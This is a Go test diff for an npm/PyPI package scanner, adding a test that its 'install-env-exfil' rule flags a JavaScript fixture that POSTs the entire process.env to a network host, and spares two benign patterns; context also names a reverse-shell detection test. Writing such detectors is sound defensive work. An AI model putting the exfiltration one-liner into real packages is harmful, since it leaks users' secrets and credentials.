@@ -147,6 +147,27 @@ func TestSBOMProvenanceNotFlaggedAsC2(t *testing.T) {
 	}
 }
 
+func TestEnvExfilRequiresSendAdjacency(t *testing.T) {
+	npm := verdict.Artifact{Ecosystem: verdict.NPM}
+	pypi := verdict.Artifact{Ecosystem: verdict.PyPI}
+	// Malicious: the whole env is serialized INTO a network send body -> flagged.
+	bad := unpacked(map[string]string{"c.js": "require('https').request(u,{method:'POST'}).end(JSON.stringify(process.env));"})
+	if hasRule(Analyze(npm, bad), "install-env-exfil") == nil {
+		t.Fatal("env serialized into a POST body not flagged")
+	}
+	// Benign (esbuild shape): env spread into a subprocess options object, with an
+	// unrelated network call elsewhere -> must NOT flag.
+	ok1 := unpacked(map[string]string{"install.js": "const cp=require('child_process');cp.spawn(bin,args,{env:{...process.env,X:'1'}});require('https').get(url);"})
+	if hasRule(Analyze(npm, ok1), "install-env-exfil") != nil {
+		t.Fatal("env spread into a subprocess wrongly flagged (esbuild-class FP)")
+	}
+	// Benign (click shape): reading dict(os.environ) locally, unrelated network call.
+	ok2 := unpacked(map[string]string{"t.py": "e = dict(os.environ)\nrequests.get('http://api.example')\n"})
+	if hasRule(Analyze(pypi, ok2), "install-env-exfil") != nil {
+		t.Fatal("local dict(os.environ) read wrongly flagged (click-class FP)")
+	}
+}
+
 func TestReverseShellSource(t *testing.T) {
 	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
 	// Tier A: literal /dev/tcp idiom in source.
